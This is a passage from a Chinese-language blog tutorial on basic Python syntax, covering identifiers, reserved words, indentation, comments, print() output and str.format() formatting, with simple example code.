<li><p>在 Python 中，所有标识符<font color="#FF7F00"><strong>不能以数字开头</strong></font>。</p>
</li>
<li><p>Python 中的标识符<font color="#FF7F00"><strong>是区分大小写的</strong></font>。</p>
</li>
<li><p>以<font color="#FF7F00"><strong>下划线开头</strong></font>的标识符是<font color="#FF7F00"><strong>有特殊意义</strong></font>的。</p>
<ol>
<li>以单下划线开头 <code>_foo</code> 的代表不能直接访问的类属性，需通过类提供的接口进行访问，不能用 from xxx import * 而导入。</li>
<li>以双下划线开头的 <code>__foo</code> 代表类的私有成员，以双下划线开头和结尾的 <code>__foo__ </code>代表 Python 里特殊方法专用的标识，如 <code>__init__()</code> 代表类的构造函数。</li>
</ol>
</li>
</ol>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、Python 保留字符</strong></font></p>
<p>下面的列表显示了在Python中的保留字。这些保留字<font color="#FF7F00"><strong>不能用作常数或变数，或任何其他标识符名称</strong></font>。</p>
<p>|||<br>:-:|:-:|:-:|<br>and    |exec    |not<br>assert    |finally    |or<br>break    |for    |pass<br>class    |from    |print<br>continue    |global    |raise<br>def    |if    |return<br>del    |import    |try<br>elif    |in    |while<br>else    |is    |with<br>except    |lambda    |yield</p>
<br>

<h3 id="二-缩进-代码块"><a href="#二-缩进-代码块" class="headerlink" title="二. 缩进(代码块)"></a><font color="#FF6347" face="Comic sans MS">二. 缩进(代码块)</font></h3><p><font color="#00B2EE" face="Comic sans MS"><strong>一、注意事项：</strong></font></p>
<ol>
<li><p>学习 Python 与其他语言最大的区别就是，Python 的<font color="#FF7F00"><strong>代码块不使用大括号 <code>&#123;&#125;</code> 来控制类，函数以及其他逻辑判断</strong></font>。python 最具特色的就是<font color="#FF7F00"><strong>用缩进来写模块</strong></font>。</p>
</li>
<li><p>缩进的空白数量是可变的，但是<font color="#FF7F00"><strong>所有代码块语句必须包含相同的缩进空白数量</strong></font>，<strong>这个必须严格执行</strong>！！！</p>
</li>
<li><p>按照约定俗成的管理，应该始终坚持使用<font color="red"><strong>4个空格</strong></font>的缩进；</p>
</li>
<li><p>很多Python程序员都建议每行不超过80字符（最多79个见多）；</p>
</li>
<li><p>要将程序的不同部分分开，可使用空行，但不要在程序文件中过多地使用空行</p>
</li>
</ol>
<br>

<p>以下代码将会执行错误：<strong>缩进空白数量不一样会报错！</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># 文件名：test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Answer&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;True&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Answer&quot;</span></span><br><span class="line">    <span class="comment"># 没有严格缩进，在执行时会报错</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;False&quot;</span></span><br><span class="line"></span><br><span class="line">执行以上代码，会出现如下错误提醒：</span><br><span class="line">$ python test.py  </span><br><span class="line">  File <span class="string">&quot;test.py&quot;</span>, line <span class="number">10</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;False&quot;</span></span><br><span class="line">                ^</span><br><span class="line">IndentationError: unindent does <span class="keyword">not</span> match <span class="built_in">any</span> outer indentation level</span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、多个语句构成代码块</strong></font></p>
<ol>
<li><p>Python不像C&#x2F;C++&#x2F;Java一样一条语句是以<code>;</code>结束，而是<font color="#FF7F00"><strong>换行即表示一个语句结束</strong></font>。</p>
</li>
<li><p>缩进相同的一组语句构成一个<strong>代码块</strong>，我们称之代码组。</p>
</li>
<li><p>像if、while、def和class这样的复合语句，<strong>首行以关键字开始</strong>，<strong>以冒号( <code>:</code> )结束</strong>，该行之后的一行或多行缩进代码构成代码组。注意这里冒号( <code>:</code> )不能省略。</p>
</li>
</ol>
<br>

<p>如下实例的冒号不能省略：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> expression : </span><br><span class="line">   suite </span><br><span class="line"><span class="keyword">elif</span> expression :  </span><br><span class="line">   suite  </span><br><span class="line"><span class="keyword">else</span> :  </span><br><span class="line">   suite </span><br></pre></td></tr></table></figure>



<br>

<h3 id="三-一行和多行语句"><a href="#三-一行和多行语句" class="headerlink" title="三. 一行和多行语句"></a><font color="#FF6347" face="Comic sans MS">三. 一行和多行语句</font></h3><blockquote>
<p><font color="red"><strong>一行</strong></font>分为：</p>
</blockquote>
<ol>
<li><font color="#FF7F00"><strong>同一行显示多条语句</strong></font>;</li>
<li>将一行的语句分为多行显示(<font color="#FF7F00"><strong>一条语句以多行来书写</strong></font>)也包括在多行语句里面来讲。</li>
</ol>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>1. 同一行显示多条语句</strong></font></p>
<p>Python可以在同一行中使用多条语句，语句之间<strong>使用分号( <code>;</code> )分割</strong>，以下是一个简单的实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys; x = <span class="string">&#x27;runoob&#x27;</span>; sys.stdout.write(x + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">runoob</span><br></pre></td></tr></table></figure>



<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>3. 一条语句以多行来书写</strong></font></p>
<p>看下面的多行语句即可，是同一个意思。</p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>3. 多行语句</strong></font></p>
<blockquote>
<p><font color="red"><strong>多行</strong></font>：</p>
</blockquote>
<ol>
<li><p>Python语句中一般<font color="#FF7F00"><strong>以新行作为语句的结束符</strong></font>，但是我们可以使用斜杠（  <code>\</code> ）将一行的语句分为多行显示，斜杠（  <code>\</code> ）称为<code>多行连接符</code>。</p>
</li>
<li><p>语句中包含 [], {} 或 () 括号就<strong>不需要</strong>使用多行连接符。</p>
</li>
<li><p><font color="#FF7F00"><strong>Python语句中一般以新行作为语句的结束符</strong></font>。但是我们可以使用斜杠（  <code>\</code> ）将一行的语句分为多行显示，如下所示：</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">total = item_one + \</span><br><span class="line">        item_two + \</span><br><span class="line">        item_three</span><br></pre></td></tr></table></figure>

<br>

<ol start="2">
<li>语句中包含 [], {} 或 () 括号就不需要使用多行连接符。如下实例：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">days = [<span class="string">&#x27;Monday&#x27;</span>, <span class="string">&#x27;Tuesday&#x27;</span>, <span class="string">&#x27;Wednesday&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Thursday&#x27;</span>, <span class="string">&#x27;Friday&#x27;</span>]</span><br></pre></td></tr></table></figure>


<br>

<h3 id="四-引号"><a href="#四-引号" class="headerlink" title="四. 引号"></a><font color="#FF6347" face="Comic sans MS">四. 引号</font></h3><ol>
<li><p>Python 可以使用单引号( <code>&#39;</code> )、双引号( <code>&quot;</code> )、三引号( <code>&#39;&#39;&#39;</code> 或 <code>&quot;&quot;&quot;</code> ) <strong>来表示字符串</strong>，引号的开始与结束必须的相同类型的。</p>
</li>
<li><p><strong>其中三引号可以由多行组成，编写多行文本的快捷语法，常用于文档字符串，在文件的特定地点，</strong><font color="#FF7F00"><strong>被当做注释</strong></font>。</p>
</li>
</ol>
<p>如下示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">word = <span class="string">&#x27;word&#x27;</span></span><br><span class="line">sentence = <span class="string">&quot;这是一个句子。&quot;</span></span><br><span class="line">paragraph = <span class="string">&quot;&quot;&quot;这是一个段落。</span></span><br><span class="line"><span class="string">包含了多个语句&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>


<br>

<h3 id="五-注释"><a href="#五-注释" class="headerlink" title="五. 注释"></a><font color="#FF6347" face="Comic sans MS">五. 注释</font></h3><ol>
<li><font color="#FF7F00"><strong>python中单行注释采用 <code>#</code> 开头。</strong></font></li>
<li>python 中多行注释使用三个单引号( <code>&#39;&#39;&#39;</code> )或三个双引号( <code>&quot;&quot;&quot;</code> )。</li>
</ol>
<p>单行注释,如下示例1：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># 文件名：test.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一个注释</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Hello, Python!&quot;</span>  <span class="comment"># 第二个注释</span></span><br></pre></td></tr></table></figure>

<br>
多行注释,如下示例2：

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># 文件名：test.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这是多行注释，使用单引号。</span></span><br><span class="line"><span class="string">这是多行注释，使用单引号。</span></span><br><span class="line"><span class="string">这是多行注释，使用单引号。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这是多行注释，使用双引号。</span></span><br><span class="line"><span class="string">这是多行注释，使用双引号。</span></span><br><span class="line"><span class="string">这是多行注释，使用双引号。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<br>

<h3 id="六-空行"><a href="#六-空行" class="headerlink" title="六. 空行"></a><font color="#FF6347" face="Comic sans MS">六. 空行</font></h3><blockquote>
<ol>
<li>函数之间或类的方法之间用空行分隔，表示一段新的代码的开始。类和函数入口之间也用一行空行分隔，以突出函数入口的开始。</li>
<li>空行与代码缩进不同，空行并不是Python语法的一部分。书写时不插入空行，Python解释器运行也不会出错。但是空行的作用在于<font color="#FF7F00"><strong>分隔两段不同功能或含义的代码，便于日后代码的维护或重构</strong></font>。</li>
<li>记住：<font color="#FF7F00"><strong>空行也是程序代码的一部分</strong></font>。</li>
</ol>
</blockquote>
<p>什么是空行？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">2</span>+<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">           <span class="comment">#这里就是空行</span></span><br><span class="line">b=a+<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure>


<br>

<h3 id="七-输出-print"><a href="#七-输出-print" class="headerlink" title="七. 输出(print)"></a><font color="#FF6347" face="Comic sans MS">七. 输出(print)</font></h3><p>Python3.0以后的输出使用<code>print()</code>函数。分为<strong>换行输出</strong>和<strong>不换行输出</strong>。<br>在print()括号中加上字符串，就可以向屏幕上输出指定的文字。括号里还可以放表达式等……</p>
<blockquote>
<ol>
<li><strong>换行输出：</strong><font color="#FF7F00"><strong>print 默认输出是换行的</strong></font></li>
<li><strong>不换行输出：</strong>将括号里的所有参数输出在一行，只需要<font color="#FF7F00"><strong>在每一个参数后面加一个<code>,</code></strong></font>即可。<strong>注意：</strong></li>
</ol>
</blockquote>
<ol>
<li>最后一个参数后面没有<code>,</code>，也就是和普通函数使用一样；</li>
<li>参数中间的<code>,</code>输出来是一个空格。如下：</li>
<li>循环输出变量b的时候如果不换行，可在后面加个<code>end=&#39; &#39;</code>，即<code>print(b, end=&#39; &#39;)</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Thequickbrownfox&#x27;</span>, <span class="string">&#x27;jumpsover&#x27;</span>, <span class="string">&#x27;thelazydog&#x27;</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Thequickbrownfox jumpsover thelazydog </span><br></pre></td></tr></table></figure>


<br>


<br>

<h4 id="7-1-输出的补充"><a href="#7-1-输出的补充" class="headerlink" title="7.1 输出的补充"></a><font color="#3CB371" face="Comic sans MS">7.1 输出的补充</font></h4><blockquote>
<p><font face="Microsoft YaHei" color="#FF7F00">Python的三种输出：</font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei">Python两种输出值的方式: 表达式语句和<code>print()</code>函数；</font><ol>
<li><font face="Microsoft YaHei">如果你希望输出的形式更加多样，可以使用 <code>str.format()</code> 函数来格式化输出值。</font></li>
<li><font face="Microsoft YaHei">如果你希望将输出的值转成字符串，可以使用 <code>repr()</code> 或 <code>str()</code> 函数来实现</font>.</li>
</ol>
</li>
<li><font face="Microsoft YaHei">第三种方式是使用文件对象的<code> write()</code> 方法，标准输出文件可以用<code>sys.stdout</code>引用</font>！</li>
</ol>
<br>

<h4 id="7-2-输出时常用的函数"><a href="#7-2-输出时常用的函数" class="headerlink" title="7.2 输出时常用的函数"></a><font color="#3CB371" face="Comic sans MS">7.2 输出时常用的函数</font></h4><ul>
<li><font color="#FF7F00"><strong>str()：</strong></font> 将对象转化为适于人阅读的形式，函数返回一个对象的string格式。</li>
<li><font color="#FF7F00"><strong>repr()：</strong></font> 将对象转化为供解释器读取的形式，返回一个对象的 string 格式。可以输出包括转义字符在内的所有字符！</li>
<li><font color="#FF7F00"><strong><code>end=&#39; &#39;</code>：</strong></font> 循坏输出时常用于不换行输出。</li>
<li><font color="#FF7F00"><strong>str.format() ：</strong></font>格式化输出。</li>
</ul>
<br>

<p>举例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="string">&quot;&#x27;abcd\ne\nfg&#x27;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(x))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(x))</span><br><span class="line"></span><br><span class="line">output：</span><br><span class="line"><span class="string">&#x27;abcd</span></span><br><span class="line"><span class="string">e</span></span><br><span class="line"><span class="string">fg&#x27;</span></span><br><span class="line"><span class="string">&quot;&#x27;abcd\ne\nfg&#x27;&quot;</span></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;repr() 的参数可以是 Python 的任何对象&#x27;&#x27;&#x27;</span></span><br><span class="line">x = <span class="number">10</span> * <span class="number">3.25</span></span><br><span class="line">y = <span class="number">200</span> * <span class="number">200</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>((x, y, (<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))))</span><br><span class="line"></span><br><span class="line">output： (<span class="number">32.5</span>, <span class="number">40000</span>, (<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;  我们都知道正常情况下将多个字符串输出在一行直接使用半角逗号,分隔即可。但是循坏输出要想不换行就得</span></span><br><span class="line"><span class="string">使用 end=&#x27; &#x27;了  &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> a:</span><br><span class="line">  <span class="built_in">print</span>(x)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n----------分隔符-----------&#x27;</span>) </span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> a: </span><br><span class="line">  <span class="built_in">print</span>(y,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n----------分隔符-----------&#x27;</span>) </span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> a: </span><br><span class="line">  <span class="built_in">print</span>(y,end=<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n----------分隔符-----------&#x27;</span>) </span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> a: </span><br><span class="line">  <span class="built_in">print</span>(y,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">OUTPUT：</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"></span><br><span class="line">----------分隔符-----------</span><br><span class="line"><span class="number">123456</span></span><br><span class="line">----------分隔符-----------</span><br><span class="line">1w2w3w4w5w6w</span><br><span class="line">----------分隔符-----------</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span></span><br></pre></td></tr></table></figure>



<br>

<h4 id="7-3-str-format-格式化字符串"><a href="#7-3-str-format-格式化字符串" class="headerlink" title="7.3 str.format()格式化字符串"></a><font color="#3CB371" face="Comic sans MS">7.3 str.format()格式化字符串</font></h4><p>旧式的格式化输出在<font color="#00B2EE">[<a href="https://directoree.top/post/Python-Grammar">Python-基础语法</a>]</font>里面讲过，这里的<code>str.format()</code>就是新版的格式化的一种形式。</p>
<p><strong>语法：</strong>字符串类型格式化采用format()方法，基本使用格式是：<br><font color="#FF7F00"><strong>&lt;模板字符串&gt;.format(&lt;逗号分隔的参数&gt;)</strong></font></p>
<p>所谓的**str.format()**：即<code>.format()</code>前是一个字符串，字符串里面有<code>&#123;&#125;</code>相当于旧书式的<code>%</code>。<code>&#123;&#125;</code>及其里面的字符 (称作格式化字段) 将会被 format() 中的参数替换。分为以下几种使用方法：</p>
<br>

<ol>
<li>在括号中的<font color="#FF7F00"><strong>数字</strong></font>用于指向传入对象在 format() 中的<font color="#FF7F00"><strong>索引位置</strong></font>，如下所示：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125; 和 &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;1&#125; 和 &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">Google 和 Runoob</span><br><span class="line">Runoob 和 Google</span><br></pre></td></tr></table></figure>

<br>

<ol start="2">
<li>在 format() 中使用了<font color="#FF7F00"><strong>关键字参数, 那么它们的值会指向使用该名字的参数</strong></font>。也可以位置及关键字参数可以任意的结合:</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125; 和 &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;1&#125; 和 &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;站点列表 &#123;0&#125;, &#123;1&#125;, 和 &#123;other&#125;。&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>,</span><br><span class="line">                                                       other=<span class="string">&#x27;Taobao&#x27;</span>))</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">Google 和 Runoob</span><br><span class="line">Runoob 和 Google</span><br><span class="line">站点列表 Google, Runoob, 和 Taobao。</span><br></pre></td></tr></table></figure>

<br>

<ol start="3">
<li>在 <code>&#123;&#125;</code> 里使用 <code>!a</code> (使用 ascii()), <code>!s</code>(使用 str()) 和 <code>!r</code> (使用 repr()) 可以用于<font color="#FF7F00"><strong>在格式化某个值之前对其进行转化</strong></font>:</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;常量 PI 的值近似为： &#123;&#125;。&#x27;</span>.<span class="built_in">format</span>(math.pi))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;常量 PI 的值近似为： &#123;!s&#125;。&#x27;</span>.<span class="built_in">format</span>(math.pi))</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">常量 PI 的值近似为： <span class="number">3.141592653589793</span>。</span><br><span class="line">常量 PI 的值近似为： <span class="number">3.141592653589793</span>。</span><br></pre></td></tr></table></figure>

<br>

<ol start="4">
<li>可选项 <code>:</code> 和格式标识符可以跟着字段名。 这就允许对值进行更好的格式化。</li>
</ol>
<p>format()方法中&lt;模板字符串&gt;的<code>&#123;&#125;</code>除了包括参数序号，还可以包括格式控制信息。此时，<code>&#123;&#125;</code>的内部样式如下：</p>
<p><font color="#FF7F00">     <strong>{&lt;参数序号&gt;: &lt;格式控制标记&gt;}</strong>  </font><br>     <br>其中，&lt;格式控制标记&gt;用来控制参数显示时的格式，包括：**&lt;填充&gt;&lt;对齐&gt;&lt;宽度&gt;,&lt;.精度&gt;&lt;类型&gt;** 6 个字段，这些字段都是可选的，可以组合使用，逐一介绍如下。参考：<font color="#00B2EE">[<a href="https://blog.csdn.net/i_chaoren/article/details/77922939">Python字符串格式化–format()方法</a>]</font></p>
<p><img data-src="https://i.loli.net/2019/03/06/5c7f917b8902b.jpg" alt="1.jpg"></p>
<br>

<p><strong>&lt;宽度&gt;</strong><br>指当前槽的设定输出字符宽度，如果该槽对应的format()参数长度比&lt;宽度&gt;设定值大，则使用参数实际长度。如果该值的实际位数小于指定宽度，则位数将被默认以空格字符补充。</p>
<p><strong>&lt;对齐&gt;</strong><br>指参数在&lt;宽度&gt;内输出时的对齐方式，分别使用&lt;、&gt;和^三个符号表示左对齐、右对齐和居中对齐。</p>
<p><strong>&lt;填充&gt;</strong><br>指&lt;宽度&gt;内除了参数外的字符采用什么方式表示，默认采用空格，可以通过&lt;填充&gt;更换。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">s = <span class="string">&quot;PYTHON&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:30&#125;&quot;</span>.<span class="built_in">format</span>(s)</span><br><span class="line">Out[<span class="number">17</span>]: <span class="string">&#x27;PYTHON                        &#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:&gt;30&#125;&quot;</span>.<span class="built_in">format</span>(s)</span><br><span class="line">Out[<span class="number">18</span>]: <span class="string">&#x27;                        PYTHON&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:*^30&#125;&quot;</span>.<span class="built_in">format</span>(s)</span><br><span class="line">Out[<span class="number">19</span>]: <span class="string">&#x27;************PYTHON************&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:-^30&#125;&quot;</span>.<span class="built_in">format</span>(s)</span><br><span class="line">Out[<span class="number">20</span>]: <span class="string">&#x27;------------PYTHON------------&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:3&#125;&quot;</span>.<span class="built_in">format</span>(s)</span><br><span class="line"></span><br><span class="line">Out[<span class="number">21</span>]: <span class="string">&#x27;PYTHON&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<p><strong>逗号（，）</strong><br>&lt;格式控制标记&gt;中逗号（，）用于显示数字的千位分隔符，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&#123;0:-^20,&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">1234567890</span>)</span><br><span class="line">Out[<span class="number">24</span>]: <span class="string">&#x27;---1,234,567,890----&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:-^20&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">1234567890</span>) <span class="comment">#对比输出</span></span><br><span class="line">Out[<span class="number">25</span>]: <span class="string">&#x27;-----1234567890-----&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:-^20,&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">12345.67890</span>)</span><br><span class="line">Out[<span class="number">26</span>]: <span class="string">&#x27;----12,345.6789-----&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<p><strong>&lt;.精度&gt;</strong><br>表示两个含义，由小数点（.）开头。对于浮点数，精度表示小数部分输出的有效位数。对于字符串，精度表示输出的最大长度。</p>
<p><strong>&lt;类型&gt;</strong><br>表示输出整数和浮点数类型的格式规则。对于整数类型，输出格式包括6 种：</p>
<ul>
<li>b: 输出整数的二进制方式；</li>
<li>c: 输出整数对应的 Unicode 字符；</li>
<li>d: 输出整数的十进制方式；</li>
<li>o: 输出整数的八进制方式；</li>
<li>x: 输出整数的小写十六进制方式；</li>
<li>X: 输出整数的大写十六进制方式；</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>table = &#123;<span class="string">&#x27;Google&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;Runoob&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;Taobao&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> name, number <span class="keyword">in</span> table.items():</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(<span class="string">&#x27;&#123;0:10&#125; ==&gt; &#123;1:10d&#125;&#x27;</span>.<span class="built_in">format</span>(name, number))</span><br><span class="line">...</span><br><span class="line">Runoob     ==&gt;          2</span><br><span class="line">Taobao     ==&gt;          3</span><br><span class="line">Google     ==&gt;          1</span><br></pre></td></tr></table></figure>


<p>对于<strong>浮点数类型</strong>，输出格式包括4 种：</p>
<ul>
<li>e: 输出浮点数对应的小写字母 e 的指数形式；</li>
<li>E: 输出浮点数对应的大写字母 E 的指数形式；</li>
<li>f: 输出浮点数的标准浮点形式；</li>
<li>%: 输出浮点数的百分形式。</li>
</ul>
<br>

<ol start="5">
<li>如果你有一个很长的格式化字符串, 而你不想将它们分开, 那么在格式化时通过变量名而非位置会是很好的事情。</li>
</ol>
<p>最简单的就是传入一个字典, 然后使用方括号 <code>[]</code> 来访问键值 :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>table = &#123;<span class="string">&#x27;Google&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;Runoob&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;Taobao&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;Runoob: &#123;0[Runoob]:d&#125;; Google: &#123;0[Google]:d&#125;; Taobao: &#123;0[Taobao]:d&#125;&#x27;</span>.<span class="built_in">format</span>(table))</span><br><span class="line">Runoob: <span class="number">2</span>; Google: <span class="number">1</span>; Taobao: <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">也可以通过在 table 变量前使用 <span class="string">&#x27;**&#x27;</span> 来实现相同的功能：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>table = &#123;<span class="string">&#x27;Google&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;Runoob&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;Taobao&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;Runoob: &#123;Runoob:d&#125;; Google: &#123;Google:d&#125;; Taobao: &#123;Taobao:d&#125;&#x27;</span>.<span class="built_in">format</span>(**table))</span><br><span class="line">Runoob: <span class="number">2</span>; Google: <span class="number">1</span>; Taobao: <span class="number">3</span></span><br></pre></td></tr></table></figure>

<br>

<h3 id="八-输入-input"><a href="#八-输入-input" class="headerlink" title="八. 输入(input)"></a><font color="#FF6347" face="Comic sans MS">八. 输入(input)</font></h3><blockquote>
<ol>
<li>函数input()让程序暂停运行，等待用户输入一些文本。获取用户输入后，Python将其存储在一个变量（指针）中，以方便你使用。</li>
<li>input()函数有个返回值，<font color="#FF7F00"><strong>返回类型为String</strong></font>。</li>
</ol>
</blockquote>
<br>

<p><font color="red"><strong>一、参数</strong></font></p>
<p>输入分为两种：<strong>空参数</strong>、<strong>带有参数</strong>。</p>
<p><font color="#00B2EE"><strong>空参数：</strong></font><code>input()</code>；效果是屏幕上没有任何提示，等待用户输入。<br><font color="#00B2EE"><strong>带有参数：</strong></font><code>input(&#39;请输入一个字符串：&#39;)</code>；效果是屏幕上显示“请输入一个字符串：”，然后等待用户输入。</p>
<p><font color="red"><strong>二、返回值</strong></font></p>
<p>关于input()的返回值，是<font color="#FF7F00"><strong>字符串String类型</strong></font><br>如下会报错，假如输入1998，返回给s的值是字符串”1998”，如果直接和数字型进行比较会报错：</p>
